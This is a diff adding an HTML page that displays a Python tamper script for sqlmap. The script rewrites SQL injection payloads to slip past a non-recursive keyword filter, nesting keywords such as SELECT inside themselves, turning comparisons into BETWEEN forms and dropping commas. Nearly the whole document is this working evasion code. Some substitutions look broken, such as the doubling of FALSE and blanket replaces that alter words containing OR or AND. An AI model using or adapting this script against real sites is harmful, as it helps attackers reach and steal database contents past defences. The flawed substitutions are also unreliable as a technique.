@@ -1,0 +1,75 @@
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.10.0/styles/base16/ros-pine.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>
+
+<script>hljs.highlightAll();</script>
+
+<pre><code class="language-python">#!/usr/bin/env python
+
+import re
+
+from lib.core.enums import PRIORITY
+
+__priority__ = PRIORITY.HIGHEST
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    """
+    We have identified some sort of sanitization of the query.
+    We were able to identify:
+        - Most common operators that were deleted
+        - The fact that the sanitization process does not run recursively
+
+    --------------------------------------------------
+
+    This tampering script:
+
+    # Replaces:
+        - Greater than operators ('>') with 'NOT BETWEEN 0 AND #'
+        - Equals operators ('=') with 'BETWEEN # AND #'
+        - OR operators ('OR') with its symbolic contrapart ('||')
+        - AND operators ('AND') with its symbolic contrapart ('&&')
+
+
+    # Doubles:
+            Server-side, the following sub-strings "s" will be identified in the middle of our full string
+            "s[:l]+s+[l:]" with 1<l<length(s). The process does not run recursively, as shown by local tests, the middle "LIKE"
+            will be removed, thus leaving behind a normal "s" query.
+
+        - Pattern Matching operators ('LIKE') as ('LILIKEKE')
+        - Selection operators ('SELECT') as ('SELSELECTECT')
+        - Commenting operators ('--') as ('-=-')
+            > Here, we modify the string with a character we know will be removed by the sanitization process
+        - Boolean operators ('TRUE') and ('FALSE') as ('TRTRUEUE') and ('FALFALSE')
+        - Negation operators ('NOT') as ('NONOTT')
+
+
+    # Simply removes if are detected:
+            There is no known way to effectively replace this element in all cases
+
+        - Arguments separation operators (',')
+    """
+
+    retVal = payload
+
+    if payload:
+        match = re.search(r"(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^>]+?)\s*>\s*([^>]+)\s*\Z", payload)
+
+        if match:
+            _ = "%s %s NOT BETWEEN 0 AND %s" % (match.group(2), match.group(4), match.group(5))
+            retVal = retVal.replace(match.group(0), _)
+        else:
+            retVal = re.sub(r"\s*>\s*(\d+|'[^']+'|\w+\(\d+\))", r" NOT BETWEEN 0 AND \g<1>", payload)
+
+        if retVal == payload:
+            match = re.search(r"(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^=]+?)\s*=\s*([\w()]+)\s*", payload)
+
+            if match:
+                _ = "%s %s BETWEEN %s AND %s" % (match.group(2), match.group(4), match.group(5), match.group(5))
+                retVal = retVal.replace(match.group(0), _)
+
+    return retVal.replace("OR","||").replace("AND","&&").replace("LIKE","LILIKEKE").replace("SELECT","SELSELECTECT").replace("--","-=-").replace(",","").replace("TRUE","TRTRUEUE").replace("FALSE","FALFALSE").replace("NOT","NONOTT")
+</code></pre>
+
